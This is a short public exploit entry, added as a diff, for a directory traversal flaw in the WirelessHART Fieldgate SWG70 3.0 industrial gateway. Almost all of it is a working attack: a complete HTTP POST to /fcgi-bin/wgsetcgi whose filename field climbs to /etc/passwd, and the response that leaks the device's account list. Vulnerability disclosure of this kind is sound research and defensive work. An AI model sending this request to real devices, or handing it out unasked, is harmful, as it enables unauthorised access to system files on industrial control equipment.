@@ -1,0 +1,41 @@
+# Exploit Title: WirelessHART Fieldgate SWG70 3.0 - Directory Traversal
+# Date: 2018-08-29
+# Exploit Author: Hamit CİBO
+# Vendor Homepage: http://endress.com
+# Software Link: https://www.endress.com/en/Field-instruments-overview/System-Components-Recorder-Data-Manager/wirelesshart-gateway-fieldgate-swg70
+# Version: SWG70 3.X
+# Tested on: Windows
+# CVE :
+
+# PoC
+# Request
+
+POST /fcgi-bin/wgsetcgi HTTP/1.1
+Content-Length: 129
+Content-Type: application/x-www-form-urlencoded
+Referer: {Target}
+Cookie: ********
+Host: {Target}
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0(Windows NT 6.1;WOW64)AppleWebKit/537.21(KHTML,like Gecko)Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+action=ajax&command=4&filename=../../../../../../../../../../etc/passwd&origin=cw.Communication.File.Read&transaction=fileCommand
+
+# Response
+
+HTTP/1.1 200 OK
+Date: Fri, 13 Mar 1970 17:13:58 GMT
+Server: Apache
+Cache-Control: no-cache
+Keep-Alive : timeout=15,max=100
+Connection : Keep-Alive
+Content-Type : text/plain
+Content-Length : 333
+
+root:x:0:0:root:/root:/bin/sh
+ftp:x:11:101:ftp user:/home:/bin/false
+www:x:12:102:www user:/home:/bin/false
+sshd:x:13:100:SSH Server:/var/run/sshd:/bin/false
+service:x:500:100:Service User:/home:/bin/sh
